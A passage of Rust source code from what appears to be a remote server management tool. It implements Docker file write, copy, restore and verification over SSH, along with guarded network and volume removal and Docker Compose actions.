                "Docker volume usage",
                "container inventory was truncated; refusing to infer unused volumes",
            ));
        }
        let identities = inventory
            .items
            .into_iter()
            .map(|container| container.identity)
            .collect::<Vec<_>>();
        if identities.is_empty() {
            return Ok(BTreeSet::new());
        }
        let output = self
            .read_command(
                session,
                security_audit_command(runtime, &identities)?,
                Duration::from_secs(45),
                "inspect container volume usage",
            )
            .await?;
        let inspected = parse_security_inspections(runtime, &identities, &output)?;
        Ok(inspected
            .into_iter()
            .flat_map(|container| container.mounts)
            .filter(|mount| mount.kind == "volume" && !mount.source.is_empty())
            .map(|mount| mount.source)
            .collect())
    }

    async fn read_command(
        &self,
        session: &BoundSshSession,
        command: String,
        timeout: Duration,
        subject: &'static str,
    ) -> CoreResult<String> {
        let result = self
            .run_guarded(session.target(), || {
                self.ssh.execute_bound(session, command, timeout)
            })
            .await?;
        successful_output(subject, result)
    }

    async fn raw_command(
        &self,
        session: &BoundSshSession,
        command: String,
        timeout: Duration,
    ) -> CoreResult<SshCommandOutput> {
        self.run_guarded(session.target(), || {
            self.ssh.execute_bound(session, command, timeout)
        })
        .await
    }

    async fn sftp_request_bound(
        &self,
        session: &BoundSshSession,
        request: SftpRequest,
    ) -> CoreResult<SftpResponse> {
        self.ssh
            .sftp(session.session_id(), session.connection_id(), request)
            .await
    }

    async fn probe_file(
        &self,
        session: &BoundSshSession,
        container: &ContainerIdentity,
        path: &ContainerFilePath,
    ) -> CoreResult<ContainerFileState> {
        self.target.validate(session.target())?;
        let state = self.probe_file_bound(session, container, path).await;
        self.target.validate(session.target())?;
        state
    }

    async fn probe_file_bound(
        &self,
        session: &BoundSshSession,
        container: &ContainerIdentity,
        path: &ContainerFilePath,
    ) -> CoreResult<ContainerFileState> {
        validate_container_id(container.id())?;
        let output = self
            .ssh
            .execute_bound(
                session,
                container_file_probe_command(container, path),
                Duration::from_secs(20),
            )
            .await?;
        parse_container_file_state(&successful_output("inspect container file", output)?)
    }

    async fn probe_host_file_bound(
        &self,
        session: &BoundSshSession,
        path: &RemotePath,
    ) -> CoreResult<ContainerFileState> {
        path.file_name().map_err(|_| {
            CoreError::validation("remote host file path", "host root is not a file")
        })?;
        let output = self
            .ssh
            .execute_bound(
                session,
                host_file_probe_command(path)?,
                Duration::from_secs(20),
            )
            .await?;
        parse_container_file_state(&successful_output("inspect remote host file", output)?)
    }

    async fn probe_copy_endpoint_bound(
        &self,
        session: &BoundSshSession,
        container: &ContainerIdentity,
        endpoint: &DockerFileEndpoint,
    ) -> CoreResult<ContainerFileState> {
        match endpoint {
            DockerFileEndpoint::Host(path) => self.probe_host_file_bound(session, path).await,
            DockerFileEndpoint::Container(path) => {
                self.probe_file_bound(session, container, path).await
            }
        }
    }

    async fn read_file_bound(
        &self,
        session: &BoundSshSession,
        container: &ContainerIdentity,
        path: &ContainerFilePath,
    ) -> CoreResult<String> {
        validate_container_id(container.id())?;
        let command = format!(
            "{} exec -- {} cat {}",
            container.runtime.command(),
            shq(container.id()),
            shq(path.as_str())
        );
        let output = self
            .ssh
            .execute_bound(session, command, Duration::from_secs(20))
            .await?;
        successful_output("read container file", output)
    }

    async fn remove_host_temp(
        &self,
        session: &BoundSshSession,
        path: &RemotePath,
    ) -> CoreResult<()> {
        match self
            .sftp_request_bound(
                session,
                SftpRequest::Remove {
                    path: path.as_str().to_owned(),
                    directory: false,
                },
            )
            .await?
        {
            SftpResponse::Unit => Ok(()),
            response => Err(CoreError::validation(
                "Docker host staging cleanup",
                format!("unexpected SFTP response: {}", response.kind()),
            )),
        }
    }

    async fn run_guarded<T, F, Fut>(&self, guard: &TargetGuard, operation: F) -> CoreResult<T>
    where
        F: FnOnce() -> Fut,
        Fut: Future<Output = CoreResult<T>>,
    {
        self.target.validate(guard)?;
        let result = operation().await;
        self.target.validate(guard)?;
        result
    }

    async fn probe_state(
        &self,
        session: &BoundSshSession,
        container: &ContainerIdentity,
    ) -> CoreResult<String> {
        validate_container_id(container.id())?;
        // `{{"\t"}}` and not a bare `\t`: the runtime hands the format string
        // to a Go template, which prints an unquoted backslash-t as those two
        // characters. The parser splits on a real tab, so a bare escape means
        // every state probe fails to parse and no action can ever be planned.
        let command = format!(
            "{} inspect --format '{{{{.Id}}}}{{{{\"\\t\"}}}}{{{{.State.Status}}}}' -- {}",
            container.runtime.command(),
            shq(container.id())
        );
        let output = self
            .read_command(
                session,
                command,
                Duration::from_secs(15),
                "read container state",
            )
            .await?;
        parse_state_probe(container, &output)
    }
}

fn build_file_write_plan(
    target: TargetGuard,
    request: DockerFileWriteRequest,
    before: ContainerFileState,
) -> CoreResult<DockerFileWritePlan> {
    validate_container_id(request.container.id())?;
    if request.content.len() > MAX_CONTAINER_FILE_BYTES {
        return Err(CoreError::validation(
            "container file content",
            format!("must be at most {MAX_CONTAINER_FILE_BYTES} bytes"),
        ));
    }
    let nonce = uuid::Uuid::new_v4().simple().to_string();
    let parent = request.path.parent()?;
    let file_name = request.path.0.file_name()?;
    let container_temp_path =
        ContainerFilePath(parent.child(&format!(".{file_name}.lovelyres.tmp.{nonce}"))?);
    let backup_path =
        ContainerFilePath(parent.child(&format!(".{file_name}.lovelyres.bak.{nonce}"))?);
    let host_temp_path = RemotePath::new(format!("/tmp/.lovelyres-docker-write-{nonce}"))?;
    let content_sha256 = sha256_hex(request.content.as_bytes());
    let mut operation = OperationPlan::new(
        target,
        format!(
            "向 {} 容器 {} 里的 {} 写入 {} 字节",
            request.container.runtime.label(),
            short_container_id(request.container.id()),
            request.path.as_str(),
            request.content.len()
        ),
        true,
        Some(match before {
            ContainerFileState::Missing => "删除这次新建的容器文件".to_owned(),
            ContainerFileState::File { .. } => {
                "用写入前留下的备份把这个容器文件恢复原样".to_owned()
            }
        }),
    )?;
    operation
        .metadata
        .insert("container-id".to_owned(), request.container.id().to_owned());
    operation.metadata.insert(
        "container-path".to_owned(),
        request.path.as_str().to_owned(),
    );
    operation.metadata.insert(
        "content-bytes".to_owned(),
        request.content.len().to_string(),
    );
    operation
        .metadata
        .insert("content-sha256".to_owned(), content_sha256.clone());
    operation
        .metadata
        .insert("before".to_owned(), before.summary());
    Ok(DockerFileWritePlan {
        operation,
        container: request.container,
        path: request.path,
        content: request.content,
        content_sha256,
        before,
        container_temp_path,
        backup_path,
        host_temp_path,
    })
}

fn copy_request_endpoints(
    request: DockerFileCopyRequest,
) -> CoreResult<(
    ContainerIdentity,
    DockerFileCopyDirection,
    DockerFileEndpoint,
    DockerFileEndpoint,
)> {
    let (container, direction, source, target) = match request {
        DockerFileCopyRequest::ContainerToHost {
            container,
            source,
            target,
        } => (
            container,
            DockerFileCopyDirection::ContainerToHost,
            DockerFileEndpoint::Container(source),
            DockerFileEndpoint::Host(target),
        ),
        DockerFileCopyRequest::HostToContainer {
            container,
            source,
            target,
        } => (
            container,
            DockerFileCopyDirection::HostToContainer,
            DockerFileEndpoint::Host(source),
            DockerFileEndpoint::Container(target),
        ),
        DockerFileCopyRequest::InContainer {
            container,
            source,
            target,
        } => (
            container,
            DockerFileCopyDirection::InContainer,
            DockerFileEndpoint::Container(source),
            DockerFileEndpoint::Container(target),
        ),
    };
    validate_container_id(container.id())?;
    endpoint_file_name(&source)?;
    endpoint_file_name(&target)?;
    for endpoint in [&source, &target] {
        if matches!(endpoint, DockerFileEndpoint::Host(path) if path.as_str().contains(':')) {
            return Err(CoreError::validation(
                "Docker remote host path",
                "colon is not supported because Docker uses it as a container delimiter",
            ));
        }
    }
    Ok((container, direction, source, target))
}

fn endpoint_file_name(endpoint: &DockerFileEndpoint) -> CoreResult<&str> {
    match endpoint {
        DockerFileEndpoint::Host(path) => path.file_name(),
        DockerFileEndpoint::Container(path) => path.0.file_name(),
    }
}

fn endpoint_sibling(endpoint: &DockerFileEndpoint, name: &str) -> CoreResult<DockerFileEndpoint> {
    match endpoint {
        DockerFileEndpoint::Host(path) => Ok(DockerFileEndpoint::Host(path.parent()?.child(name)?)),
        DockerFileEndpoint::Container(path) => Ok(DockerFileEndpoint::Container(
            ContainerFilePath(path.parent()?.child(name)?),
        )),
    }
}

#[allow(clippy::too_many_arguments)]
fn build_file_copy_plan(
    target_guard: TargetGuard,
    container: ContainerIdentity,
    direction: DockerFileCopyDirection,
    source: DockerFileEndpoint,
    target: DockerFileEndpoint,
    source_revision: ContainerFileState,
    target_before: ContainerFileState,
) -> CoreResult<DockerFileCopyPlan> {
    let nonce = uuid::Uuid::new_v4().simple().to_string();
    let target_name = endpoint_file_name(&target)?;
    let target_temporary = endpoint_sibling(
        &target,
        &format!(".{target_name}.lovelyres.copy.tmp.{nonce}"),
    )?;
    let target_backup = endpoint_sibling(
        &target,
        &format!(".{target_name}.lovelyres.copy.bak.{nonce}"),
    )?;
    let restore_description = Some(match target_before {
        ContainerFileState::Missing => "删除这次新复制出来的目标文件".to_owned(),
        ContainerFileState::File { .. } => "用复制前留下的备份把目标文件恢复原样".to_owned(),
    });
    let mut operation = OperationPlan::new(
        target_guard,
        format!(
            "把{} {}（{} 字节）复制到{} {}（{} 容器 {}）",
            source.domain_label(),
            source.path(),
            match source_revision {
                ContainerFileState::File { bytes, .. } => bytes,
                ContainerFileState::Missing => 0,
            },
            target.domain_label(),
            target.path(),
            container.runtime.label(),
            short_container_id(container.id())
        ),
        true,
        restore_description,
    )?;
    operation
        .metadata
        .insert("container-id".to_owned(), container.id().to_owned());
    operation
        .metadata
        .insert("direction".to_owned(), direction.id().to_owned());
    operation
        .metadata
        .insert("source-path".to_owned(), source.path().to_owned());
    operation
        .metadata
        .insert("target-path".to_owned(), target.path().to_owned());
    operation
        .metadata
        .insert("source-revision".to_owned(), source_revision.summary());
    operation
        .metadata
        .insert("target-before".to_owned(), target_before.summary());
    Ok(DockerFileCopyPlan {
        operation,
        container,
        direction,
        source,
        target,
        source_revision,
        target_before,
        target_temporary,
        target_backup,
    })
}

#[derive(Debug)]
struct DockerFileCopyExecutor<'a> {
    service: &'a DockerService,
    session: &'a BoundSshSession,
    plan: &'a DockerFileCopyPlan,
}

impl DockerFileCopyExecutor<'_> {
    fn ensure_plan(&self, operation: &OperationPlan) -> CoreResult<()> {
        if operation != &self.plan.operation {
            return Err(CoreError::validation(
                "Docker file copy",
                "executor received a different immutable plan",
            ));
        }
        Ok(())
    }

    async fn probe(&self, endpoint: &DockerFileEndpoint) -> CoreResult<ContainerFileState> {
        self.service
            .probe_copy_endpoint_bound(self.session, &self.plan.container, endpoint)
            .await
    }

    async fn run(&self, command: String, subject: &'static str) -> CoreResult<SshCommandOutput> {
        let output = self
            .service
            .ssh
            .execute_bound(self.session, command, Duration::from_secs(90))
            .await?;
        if output.timed_out || output.exit_code != Some(0) {
            return Ok(output);
        }
        let _ = successful_output(subject, output.clone())?;
        Ok(output)
    }

    async fn cleanup_only(&self) -> CoreResult<()> {
        let output = self
            .service
            .ssh
            .execute_bound(
                self.session,
                copy_cleanup_command(self.plan)?,
                Duration::from_secs(30),
            )
            .await?;
        successful_output("clean Docker copy staging", output)?;
        Ok(())
    }
}

#[async_trait]
impl OperationExecutor for DockerFileCopyExecutor<'_> {
    async fn execute(&self, operation: &OperationPlan) -> CoreResult<ExecutionReceipt> {
        self.ensure_plan(operation)?;
        let source = self.probe(&self.plan.source).await?;
        let target = self.probe(&self.plan.target).await?;
        if source != self.plan.source_revision || target != self.plan.target_before {
            return Err(CoreError::validation(
                "Docker file copy precondition",
                format!(
                    "source/target changed: expected {}/{} but observed {}/{}",
                    self.plan.source_revision.summary(),
                    self.plan.target_before.summary(),
                    source.summary(),
                    target.summary()
                ),
            ));
        }
        for (label, endpoint) in [
            ("temporary", &self.plan.target_temporary),
            ("backup", &self.plan.target_backup),
        ] {
            if self.probe(endpoint).await? != ContainerFileState::Missing {
                return Err(CoreError::validation(
                    "Docker file copy staging",
                    format!("managed {label} path already exists"),
                ));
            }
        }

        let copy = self
            .run(
                copy_to_temporary_command(self.plan)?,
                "stage Docker file copy",
            )
            .await?;
        let copy_succeeded = copy.exit_code == Some(0) && !copy.timed_out;
        let install = if copy_succeeded {
            Some(
                self.run(copy_install_command(self.plan)?, "install Docker file copy")
                    .await?,
            )
        } else {
            None
        };
        let install_succeeded = install
            .as_ref()
            .is_some_and(|output| output.exit_code == Some(0) && !output.timed_out);
        Ok(ExecutionReceipt {
            summary: format!(
                "Docker file copy dispatched: {} bytes, sha256 {}, copy={}, install={}",
                self.plan.source_bytes(),
                self.plan.source_sha256(),
                if copy_succeeded { "ok" } else { "failed" },
                if install_succeeded { "ok" } else { "failed" }
            ),
            restore_token: Some(format!(
                "copy={}|install={}",
                if copy_succeeded { "ok" } else { "failed" },
                if install_succeeded { "ok" } else { "failed" }
            )),
        })
    }

    async fn verify(
        &self,
        operation: &OperationPlan,
        receipt: &ExecutionReceipt,
    ) -> CoreResult<VerificationResult> {
        self.ensure_plan(operation)?;
        let (copied, installed) = copy_receipt_status(receipt)?;
        let source = self.probe(&self.plan.source).await?;
        let target = self.probe(&self.plan.target).await?;
        let passed = copied
            && installed
            && source == self.plan.source_revision
            && target == self.plan.source_revision;
        Ok(VerificationResult {
            passed,
            detail: if passed {
                format!(
                    "源文件与目标文件一致：{} 字节，SHA-256 {}。",
                    self.plan.source_bytes(),
                    self.plan.source_sha256()
                )
            } else if !copied || !installed {
                "复制或替换目标文件这一步没有完成。".to_owned()
            } else {
                format!(
                    "复制后源文件与目标文件不一致：{}，{}。",
                    source.description("源文件"),
                    target.description("目标文件")
                )
            },
        })
    }

    async fn restore(
        &self,
        operation: &OperationPlan,
        receipt: &ExecutionReceipt,
    ) -> CoreResult<()> {
        self.ensure_plan(operation)?;
        let (_, installed) = copy_receipt_status(receipt)?;
        let current = self.probe(&self.plan.target).await?;
        if current == self.plan.target_before {
            self.cleanup_only().await?;
            return Ok(());
        }
        if !installed {
            self.cleanup_only().await?;
            return Err(CoreError::validation(
                "Docker file copy restore",
                "install did not succeed and target changed independently; refusing to overwrite it",
            ));
        }
        if current != self.plan.source_revision {
            return Err(CoreError::validation(
                "Docker file copy restore",
                format!(
                    "target no longer matches this operation ({}) and will not be overwritten",
                    current.summary()
                ),
            ));
        }
        let output = self
            .service
            .ssh
            .execute_bound(
                self.session,
                copy_restore_command(self.plan)?,
                Duration::from_secs(45),
            )
            .await?;
        successful_output("restore Docker file copy", output)?;
        let restored = self.probe(&self.plan.target).await?;
        if restored != self.plan.target_before {
            return Err(CoreError::validation(
                "Docker file copy restore verification",
                format!(
                    "expected {} but observed {}",
                    self.plan.target_before.summary(),
                    restored.summary()
                ),
            ));
        }
        Ok(())
    }
}

fn copy_receipt_status(receipt: &ExecutionReceipt) -> CoreResult<(bool, bool)> {
    match receipt.restore_token.as_deref() {
        Some("copy=ok|install=ok") => Ok((true, true)),
        Some("copy=ok|install=failed") => Ok((true, false)),
        Some("copy=failed|install=failed") => Ok((false, false)),
        _ => Err(CoreError::validation(
            "Docker file copy receipt",
            "receipt did not match the immutable copy plan",
        )),
    }
}

#[derive(Debug)]
struct DockerFileWriteExecutor<'a> {
    service: &'a DockerService,
    session: &'a BoundSshSession,
    plan: &'a DockerFileWritePlan,
}

impl DockerFileWriteExecutor<'_> {
    fn ensure_plan(&self, operation: &OperationPlan) -> CoreResult<()> {
        if operation != &self.plan.operation {
            return Err(CoreError::validation(
                "Docker file write",
                "executor received a different immutable plan",
            ));
        }
        Ok(())
    }

    async fn stage_host_content(&self) -> CoreResult<()> {
        match self
            .service
            .sftp_request_bound(
                self.session,
                SftpRequest::WriteNew {
                    path: self.plan.host_temp_path.as_str().to_owned(),
                    content: self.plan.content.as_bytes().to_vec(),
                    mode: Some(0o600),
                },
            )
            .await?
        {
            SftpResponse::Transfer { bytes } if bytes == self.plan.content.len() as u64 => Ok(()),
            SftpResponse::Transfer { bytes } => Err(CoreError::validation(
                "Docker host staging",
                format!(
                    "expected {} staged bytes but SFTP reported {bytes}",
                    self.plan.content.len()
                ),
            )),
            response => Err(CoreError::validation(
                "Docker host staging",
                format!("unexpected SFTP response: {}", response.kind()),
            )),
        }
    }

    async fn cleanup_host_content(&self) -> CoreResult<()> {
        self.service
            .remove_host_temp(self.session, &self.plan.host_temp_path)
            .await
    }

    async fn restore_and_verify(&self) -> CoreResult<()> {
        let current = self
            .service
            .probe_file_bound(self.session, &self.plan.container, &self.plan.path)
            .await?;
        let command = if current == self.plan.before {
            container_file_cleanup_command(&self.plan.container, self.plan)
        } else {
            container_file_restore_command(&self.plan.container, self.plan)
        };
        let output = self
            .service
            .ssh
            .execute_bound(self.session, command, Duration::from_secs(30))
            .await?;
        successful_output("restore container file", output)?;
        let restored = self
            .service
            .probe_file_bound(self.session, &self.plan.container, &self.plan.path)
            .await?;
        if restored != self.plan.before {
            return Err(CoreError::validation(
                "Docker file restore verification",
                format!(
                    "expected {} but observed {}",
                    self.plan.before.summary(),
                    restored.summary()
                ),
            ));
        }
        Ok(())
    }
}

#[async_trait]
impl OperationExecutor for DockerFileWriteExecutor<'_> {
    async fn execute(&self, operation: &OperationPlan) -> CoreResult<ExecutionReceipt> {
        self.ensure_plan(operation)?;
        let current = self
            .service
            .probe_file_bound(self.session, &self.plan.container, &self.plan.path)
            .await?;
        if current != self.plan.before {
            return Err(CoreError::validation(
                "Docker file write precondition",
                format!(
                    "file changed from {} to {}; create a new plan",
                    self.plan.before.summary(),
                    current.summary()
                ),
            ));
        }

        self.stage_host_content().await?;
        let copy_result = self
            .service
            .ssh
            .execute_bound(
                self.session,
                container_file_copy_command(&self.plan.container, self.plan),
                Duration::from_secs(45),
            )
            .await;
        let cleanup_result = self.cleanup_host_content().await;
        let copy = copy_result?;
        cleanup_result?;

        let copy_succeeded = copy.exit_code == Some(0) && !copy.timed_out;
        let install = if copy_succeeded {
            Some(
                self.service
                    .ssh
                    .execute_bound(
                        self.session,
                        container_file_install_command(&self.plan.container, self.plan),
                        Duration::from_secs(45),
                    )
                    .await?,
            )
        } else {
            None
        };
        let install_succeeded = install
            .as_ref()
            .is_some_and(|output| output.exit_code == Some(0) && !output.timed_out);
        Ok(ExecutionReceipt {
            summary: format!(
                "container file write dispatched: {} bytes, sha256 {}, copy={}, install={}",
                self.plan.content.len(),
                self.plan.content_sha256,
                if copy_succeeded { "ok" } else { "failed" },
                if install_succeeded { "ok" } else { "failed" }
            ),
            restore_token: Some(format!(
                "{}|copy={}|install={}",
                self.plan.before.summary(),
                if copy_succeeded { "ok" } else { "failed" },
                if install_succeeded { "ok" } else { "failed" }
            )),
        })
    }

    async fn verify(
        &self,
        operation: &OperationPlan,
        receipt: &ExecutionReceipt,
    ) -> CoreResult<VerificationResult> {
        self.ensure_plan(operation)?;
        let dispatch_succeeded = validate_file_write_receipt(self.plan, receipt)?;
        let observed = self
            .service
            .read_file_bound(self.session, &self.plan.container, &self.plan.path)
            .await?;
        let passed = dispatch_succeeded && observed.as_bytes() == self.plan.content.as_bytes();
        Ok(VerificationResult {
            passed,
            detail: if passed {
                format!(
                    "重新读出的内容与这次写入的完全一致：{} 字节，SHA-256 {}。",
                    self.plan.content.len(),
                    self.plan.content_sha256
                )
            } else if !dispatch_succeeded {
                "复制进容器或替换文件这一步没有完成。".to_owned()
            } else {
                format!(
                    "重新读出的内容与计划写入的 {} 字节不一致。",
                    self.plan.content.len()
                )
            },
        })
    }

    async fn restore(
        &self,
        operation: &OperationPlan,
        receipt: &ExecutionReceipt,
    ) -> CoreResult<()> {
        self.ensure_plan(operation)?;
        validate_file_write_receipt(self.plan, receipt)?;
        self.restore_and_verify().await
    }
}

fn validate_file_write_receipt(
    plan: &DockerFileWritePlan,
    receipt: &ExecutionReceipt,
) -> CoreResult<bool> {
    let prefix = format!("{}|copy=", plan.before.summary());
    let token = receipt.restore_token.as_deref().ok_or_else(|| {
        CoreError::validation(
            "Docker file write receipt",
            "receipt has no pre-write state token",
        )
    })?;
    if !token.starts_with(&prefix) {
        return Err(CoreError::validation(
            "Docker file write receipt",
            "receipt is not bound to the observed pre-write file state",
        ));
    }
    match token.strip_prefix(&prefix) {
        Some("ok|install=ok") => Ok(true),
        Some("ok|install=failed") | Some("failed|install=failed") => Ok(false),
        _ => Err(CoreError::validation(
            "Docker file write receipt",
            "receipt contains an invalid dispatch status",
        )),
    }
}

fn is_protected_network_name(name: &str) -> bool {
    matches!(name, "bridge" | "host" | "none")
}

fn ensure_network_removable(inspection: &DockerNetworkInspection) -> CoreResult<()> {
    validate_runtime_hex_id("container network id", &inspection.network.id)?;
    if is_protected_network_name(&inspection.network.name) || inspection.ingress {
        return Err(CoreError::validation(
            "Docker network removal",
            "built-in and ingress networks are protected",
        ));
    }
    if !inspection.attachments.is_empty() {
        return Err(CoreError::validation(
            "Docker network removal",
            format!(
                "network still has {} attached container(s)",
                inspection.attachments.len()
            ),
        ));
    }
    Ok(())
}

fn ensure_volume_removable(
    inspection: &DockerVolumeInspection,
    used_mountpoints: &BTreeSet<String>,
) -> CoreResult<()> {
    validate_volume_name(&inspection.volume.name)?;
    if inspection.volume.mountpoint.is_empty() {
        return Err(CoreError::validation(
            "Docker volume removal",
            "runtime did not provide an exact volume mountpoint",
        ));
    }
    if used_mountpoints.contains(&inspection.volume.mountpoint) {
        return Err(CoreError::validation(
            "Docker volume removal",
            "volume is referenced by a current container mount",
        ));
    }
    Ok(())
}

fn build_resource_mutation_plan(
    target: TargetGuard,
    kind: DockerResourceMutationKind,
    runtime: ContainerRuntime,
    mut network_snapshots: Vec<DockerNetworkInspection>,
    mut volume_snapshots: Vec<DockerVolumeInspection>,
) -> CoreResult<DockerResourceMutationPlan> {
    network_snapshots.sort_by(|left, right| left.network.id.cmp(&right.network.id));
    volume_snapshots.sort_by(|left, right| left.volume.name.cmp(&right.volume.name));
    let shape_is_valid = match kind {
        DockerResourceMutationKind::RemoveNetwork => {
            network_snapshots.len() == 1 && volume_snapshots.is_empty()
        }
        DockerResourceMutationKind::PruneNetworks => {
            !network_snapshots.is_empty() && volume_snapshots.is_empty()
        }
        DockerResourceMutationKind::RemoveVolume => {
            network_snapshots.is_empty() && volume_snapshots.len() == 1
        }
        DockerResourceMutationKind::PruneVolumes => {
            network_snapshots.is_empty() && !volume_snapshots.is_empty()
        }
    };
    if !shape_is_valid {
        return Err(CoreError::validation(
            "Docker resource plan",
            "no removable resources were found or the request shape was inconsistent",
        ));
    }
    if network_snapshots
        .iter()
        .any(|snapshot| snapshot.network.runtime != runtime)
        || volume_snapshots
            .iter()
            .any(|snapshot| snapshot.volume.runtime != runtime)
    {
        return Err(CoreError::validation(
            "Docker resource plan",
            "all resources must belong to the selected runtime",
        ));
    }
    let targets = network_snapshots
        .iter()
        .map(|snapshot| DockerResourceTarget::Network {
            id: snapshot.network.id.clone(),
            name: snapshot.network.name.clone(),
        })
        .chain(
            volume_snapshots
                .iter()
                .map(|snapshot| DockerResourceTarget::Volume {
                    name: snapshot.volume.name.clone(),
                }),
        )
        .collect::<Vec<_>>();
    let mut digest = Sha256::new();
    digest.update(kind.id().as_bytes());
    for target in &targets {
        match target {
            DockerResourceTarget::Network { id, .. } => {
                digest.update((id.len() as u64).to_be_bytes());
                digest.update(id.as_bytes());
            }
            DockerResourceTarget::Volume { name } => {
                digest.update((name.len() as u64).to_be_bytes());
                digest.update(name.as_bytes());
            }
        }
    }
    let mut operation = OperationPlan::new(
        target,
        format!(
            "{} {} 个 {} 资源",
            kind.label(),
            targets.len(),
            runtime.label()
        ),
        true,
        None,
    )?;
    operation
        .metadata
        .insert("resource-action".to_owned(), kind.id().to_owned());
    operation
        .metadata
        .insert("runtime".to_owned(), runtime.label().to_owned());
    operation
        .metadata
        .insert("resource-count".to_owned(), targets.len().to_string());
    operation.metadata.insert(
        "resource-set-sha256".to_owned(),
        format!("{:x}", digest.finalize()),
    );
    Ok(DockerResourceMutationPlan {
        operation,
        kind,
        runtime,
        targets,
        network_snapshots,
        volume_snapshots,
    })
}

fn parse_compose_config_files(value: &str) -> CoreResult<Vec<RemotePath>> {
    let parts = value.split(',').map(str::trim).collect::<Vec<_>>();
    if parts.is_empty() || parts.len() > 16 || parts.iter().any(|part| part.is_empty()) {
        return Err(CoreError::validation(
            "Docker Compose config files",
            "requires between 1 and 16 non-empty absolute POSIX paths",
        ));
    }
    let mut seen = BTreeSet::new();
    let mut paths = Vec::with_capacity(parts.len());
    for part in parts {
        let path = RemotePath::new(part.to_owned())?;
        if path.as_str() == "/" || !seen.insert(path.clone()) {
            return Err(CoreError::validation(
                "Docker Compose config files",
                "config paths must be unique files rather than the remote root",
            ));
        }
        paths.push(path);
    }
    Ok(paths)
}

fn build_compose_action_plan(
    target: TargetGuard,
    request: DockerComposeActionRequest,
    config_files: Vec<RemotePath>,
) -> CoreResult<DockerComposeActionPlan> {
    validate_compose_project_name(&request.project.name)?;
    if !request.action.is_available(&request.project) || config_files.is_empty() {
        return Err(CoreError::validation(
            "Docker Compose action",
            "project state or config-file set does not permit this action",
        ));
    }
    let mut digest = Sha256::new();
    for path in &config_files {
        digest.update((path.as_str().len() as u64).to_be_bytes());
        digest.update(path.as_str().as_bytes());
    }
    let mut operation = OperationPlan::new(
        target,
        format!(
            "{} {} Compose 项目 {}",
            request.action.label(),
            request.project.runtime.label(),
            request.project.name
        ),
        true,
        None,
    )?;
    operation
        .metadata
        .insert("compose-project".to_owned(), request.project.name.clone());
    operation
        .metadata
        .insert("compose-action".to_owned(), request.action.id().to_owned());
    operation.metadata.insert(
        "compose-config-count".to_owned(),
        config_files.len().to_string(),
    );
    operation.metadata.insert(
        "compose-config-sha256".to_owned(),
        format!("{:x}", digest.finalize()),
    );
    Ok(DockerComposeActionPlan {
        operation,
        project: request.project,
        config_files,
        action: request.action,
    })
}

fn compose_action_command(plan: &DockerComposeActionPlan) -> CoreResult<String> {
    validate_compose_project_name(&plan.project.name)?;
    if plan.config_files.is_empty() || plan.config_files.len() > 16 {
        return Err(CoreError::validation(
            "Docker Compose action",
            "plan has an invalid config-file set",
        ));
    }
    let mut command = format!(
        "{} compose -p {}",
        plan.project.runtime.command(),
        shq(&plan.project.name)
    );
    for path in &plan.config_files {
        command.push_str(" -f ");
        command.push_str(&shq(path.as_str()));
    }
    command.push(' ');
    command.push_str(match plan.action {
        DockerComposeAction::Up => "up -d",
        DockerComposeAction::Down => "down",
        DockerComposeAction::Restart => "restart",
        DockerComposeAction::Stop => "stop",
        DockerComposeAction::Pull => "pull",
    });
    Ok(command)
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
struct ResourceDispatchStatus {
    total: usize,
    attempted: usize,
    succeeded: usize,
    failed: usize,
    indeterminate: usize,
}

impl ResourceDispatchStatus {
    fn token(self) -> String {
        format!(
            "resource-dispatch/v1/{}/{}/{}/{}/{}",
            self.total, self.attempted, self.succeeded, self.failed, self.indeterminate
        )
    }

    fn parse(token: Option<&str>) -> CoreResult<Self> {
        let token = token.ok_or_else(|| {
            CoreError::validation("Docker resource receipt", "missing dispatch token")
        })?;
        let fields = token.split('/').collect::<Vec<_>>();
        if fields.len() != 7 || fields[0] != "resource-dispatch" || fields[1] != "v1" {
            return Err(CoreError::validation(
                "Docker resource receipt",
                "invalid dispatch token",
            ));
        }
        let parse = |index: usize| {
            fields[index].parse::<usize>().map_err(|_| {
                CoreError::validation("Docker resource receipt", "invalid dispatch count")
            })
        };
        let status = Self {
            total: parse(2)?,
            attempted: parse(3)?,
            succeeded: parse(4)?,
            failed: parse(5)?,
            indeterminate: parse(6)?,
        };
        if status.attempted > status.total
            || status.succeeded + status.failed + status.indeterminate != status.attempted
        {
            return Err(CoreError::validation(
                "Docker resource receipt",
                "dispatch counts are inconsistent",
            ));
        }
        Ok(status)
    }
}

#[derive(Debug)]
struct DockerResourceMutationExecutor<'a> {
    service: &'a DockerService,
    session: &'a BoundSshSession,
    plan: &'a DockerResourceMutationPlan,
}

impl DockerResourceMutationExecutor<'_> {
    fn ensure_plan(&self, operation: &OperationPlan) -> CoreResult<()> {
        if operation.id != self.plan.operation.id || operation.target != self.plan.operation.target
        {
            return Err(CoreError::validation(
                "Docker resource operation",
                "executor is bound to a different immutable plan",
            ));
        }
        Ok(())
    }

    async fn recheck_snapshots(&self) -> CoreResult<()> {
        for expected in &self.plan.network_snapshots {
            let observed = self
                .service
                .inspect_network(self.session, &expected.network)
                .await?;
            if &observed != expected {
                return Err(CoreError::validation(
                    "Docker network operation precondition",
                    format!(
                        "network {} changed after confirmation was prepared",
                        expected.network.id
                    ),
                ));
            }
            ensure_network_removable(&observed)?;
        }
        if !self.plan.volume_snapshots.is_empty() {
            let used = self
                .service
                .used_volume_mountpoints(self.session, self.plan.runtime)
                .await?;
            for expected in &self.plan.volume_snapshots {
                let observed = self
                    .service
                    .inspect_volume(self.session, &expected.volume)
                    .await?;
                if &observed != expected {
                    return Err(CoreError::validation(
                        "Docker volume operation precondition",
                        format!(
                            "volume {} changed after confirmation was prepared",
                            expected.volume.name
                        ),
                    ));
                }
                ensure_volume_removable(&observed, &used)?;
            }
        }
        Ok(())
    }

    fn command_for(&self, target: &DockerResourceTarget) -> CoreResult<String> {
        match (self.plan.kind, target) {
            (
                DockerResourceMutationKind::RemoveNetwork
                | DockerResourceMutationKind::PruneNetworks,
                DockerResourceTarget::Network { id, .. },
            ) => {
                validate_runtime_hex_id("container network id", id)?;
                Ok(format!(
                    "{} network rm -- {}",
                    self.plan.runtime.command(),
                    shq(id)
                ))
            }
            (
                DockerResourceMutationKind::RemoveVolume | DockerResourceMutationKind::PruneVolumes,
                DockerResourceTarget::Volume { name },
            ) => {
                validate_volume_name(name)?;
                Ok(format!(
                    "{} volume rm -- {}",
                    self.plan.runtime.command(),
                    shq(name)
                ))
            }
            _ => Err(CoreError::validation(
                "Docker resource operation",
                "resource target does not match the immutable plan kind",
            )),
        }
    }
}

#[async_trait]
